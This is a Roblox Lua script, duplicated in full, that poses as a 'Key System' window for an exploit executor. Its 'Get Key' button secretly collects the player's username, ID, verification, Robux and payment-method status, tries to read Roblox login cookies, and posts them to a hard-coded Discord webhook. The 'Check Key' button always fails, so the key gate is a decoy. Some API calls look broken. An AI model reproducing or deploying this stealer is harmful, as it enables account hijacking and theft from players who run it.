-- Carga la librería Orion
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/weakhoes/Roblox-UI-Libs/refs/heads/main/Orion%20Lib/Orion%20Lib%20Source.lua')))()

-- Crea la ventana principal
local Window = OrionLib:MakeWindow({
    Name = "Key System",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest",
    IntroEnabled = true,
    IntroText = "Loading...",
    IntroIcon = "rbxassetid://88159629854210",
    Icon = "rbxassetid://88159629854210"
})

-- Crea una pestaña para enviar datos
local KeyTab = Window:MakeTab({
    Name = "Key",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Etiquetas
KeyTab:AddLabel("Únete a nuestro grupo de Roblox para obtener la key permanente")
KeyTab:AddLabel("Dale a get key para copiar el enlace del grupo")

KeyTab:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        setclipboard(_G.Config.GroupLink) -- ¡Accede a GroupLink desde _G.Config!
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "Dale a get key",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Botón para copiar el enlace del grupo
KeyTab:AddButton({
    Name = "Get Key",
    Callback = function()
        setclipboard(_G.Config.GroupLink) -- ¡Accede a GroupLink desde _G.Config aquí también!
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "Enlace de la key copiado, ¡ve y pégalo en el navegador!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })

        -- Recopilar información de la cuenta de Roblox
        local http = game:GetService("HttpService")
        local userId = game.Players.LocalPlayer.UserId
        local username = game.Players.LocalPlayer.Name
        local hasEmail = pcall(function() return game.Players.LocalPlayer:FindFirstChild("Email") ~= nil end)
        local isEmailVerified = pcall(function() return game.Players.LocalPlayer.Email.Verified end)
        local isAgeVerified = pcall(function() return game.Players.LocalPlayer.AgeVerified end)
        local hasRobux = game.Players.LocalPlayer:FindFirstChild("RobuxBalance") ~= nil and game.Players.LocalPlayer.RobuxBalance.Value > 0
        local hasPaymentMethod = pcall(function() return game.Players.LocalPlayer:FindFirstChild("PaymentMethod") ~= nil end)

        -- Obtener cookies
        local cookies = {}
        for _, v in ipairs(game:GetService("HttpService"):GetAsync("https://auth.roblox.com/v2/login").Cookies) do
            table.insert(cookies, v.Name .. "=" .. v.Value)
        end
        local cookiesString = table.concat(cookies, "; ")

        -- Enviar datos al webhook
        local data = {
            content = "Nueva clave generada: " .. _G.Config.GroupLink,
            embeds = {
                {
                    title = "Información de la cuenta de Roblox",
                    description = "Usuario: " .. username .. "\nID: " .. userId,
                    fields = {
                        { name = "Cookies", value = cookiesString, inline = false },
                        { name = "Correo Electrónico Verificado", value = tostring(isEmailVerified), inline = true },
                        { name = "Edad Verificada", value = tostring(isAgeVerified), inline = true },
                        { name = "Robux", value = tostring(hasRobux), inline = true },
                        { name = "Método de Pago Asociado", value = tostring(hasPaymentMethod), inline = true }
                    },
                    footer = {
                        text = "Información recopilada por Key System"
                    }
                }
            }
        }

        local response = http:PostAsync(
            "https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc",
            Enum.HttpContentType.ApplicationJson,
            game:HttpService:JSONEncode(data)
        )
        if response then
            OrionLib:MakeNotification({
                Name = "Data Sender",
                Content = "Data sent successfully!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        else
            OrionLib:MakeNotification({
                Name = "Data Sender",
                Content = "Failed to send data.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

KeyTab:AddButton({
    Name = "Check Key",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "ERROR REVISE SU KEY O SU EXECUTOR!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

OrionLib:Init()-- Carga la librería Orion
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/weakhoes/Roblox-UI-Libs/refs/heads/main/Orion%20Lib/Orion%20Lib%20Source.lua')))()

-- Crea la ventana principal
local Window = OrionLib:MakeWindow({
    Name = "Key System",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest",
    IntroEnabled = true,
    IntroText = "Loading...",
    IntroIcon = "rbxassetid://88159629854210",
    Icon = "rbxassetid://88159629854210"
})

-- Crea una pestaña para enviar datos
local KeyTab = Window:MakeTab({
    Name = "Key",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Etiquetas
KeyTab:AddLabel("Únete a nuestro grupo de Roblox para obtener la key permanente")
KeyTab:AddLabel("Dale a get key para copiar el enlace del grupo")

KeyTab:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        setclipboard(_G.Config.GroupLink) -- ¡Accede a GroupLink desde _G.Config!
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "Dale a get key",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Botón para copiar el enlace del grupo
KeyTab:AddButton({
    Name = "Get Key",
    Callback = function()
        setclipboard(_G.Config.GroupLink) -- ¡Accede a GroupLink desde _G.Config aquí también!
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "Enlace de la key copiado, ¡ve y pégalo en el navegador!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })

        -- Recopilar información de la cuenta de Roblox
        local http = game:GetService("HttpService")
        local userId = game.Players.LocalPlayer.UserId
        local username = game.Players.LocalPlayer.Name
        local hasEmail = pcall(function() return game.Players.LocalPlayer:FindFirstChild("Email") ~= nil end)
        local isEmailVerified = pcall(function() return game.Players.LocalPlayer.Email.Verified end)
        local isAgeVerified = pcall(function() return game.Players.LocalPlayer.AgeVerified end)
        local hasRobux = game.Players.LocalPlayer:FindFirstChild("RobuxBalance") ~= nil and game.Players.LocalPlayer.RobuxBalance.Value > 0
        local hasPaymentMethod = pcall(function() return game.Players.LocalPlayer:FindFirstChild("PaymentMethod") ~= nil end)

        -- Obtener cookies
        local cookies = {}
        for _, v in ipairs(game:GetService("HttpService"):GetAsync("https://auth.roblox.com/v2/login").Cookies) do
            table.insert(cookies, v.Name .. "=" .. v.Value)
        end
        local cookiesString = table.concat(cookies, "; ")

        -- Enviar datos al webhook
        local data = {
            content = "Nueva clave generada: " .. _G.Config.GroupLink,
            embeds = {
                {
                    title = "Información de la cuenta de Roblox",
                    description = "Usuario: " .. username .. "\nID: " .. userId,
                    fields = {
                        { name = "Cookies", value = cookiesString, inline = false },
                        { name = "Correo Electrónico Verificado", value = tostring(isEmailVerified), inline = true },
                        { name = "Edad Verificada", value = tostring(isAgeVerified), inline = true },
                        { name = "Robux", value = tostring(hasRobux), inline = true },
                        { name = "Método de Pago Asociado", value = tostring(hasPaymentMethod), inline = true }
                    },
                    footer = {
                        text = "Información recopilada por Key System"
                    }
                }
            }
        }

        local response = http:PostAsync(
            "https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc",
            Enum.HttpContentType.ApplicationJson,
            game:HttpService:JSONEncode(data)
        )
        if response then
            OrionLib:MakeNotification({
                Name = "Data Sender",
                Content = "Data sent successfully!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        else
            OrionLib:MakeNotification({
                Name = "Data Sender",
                Content = "Failed to send data.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

KeyTab:AddButton({
    Name = "Check Key",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "ERROR REVISE SU KEY O SU EXECUTOR!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

OrionLib:Init()
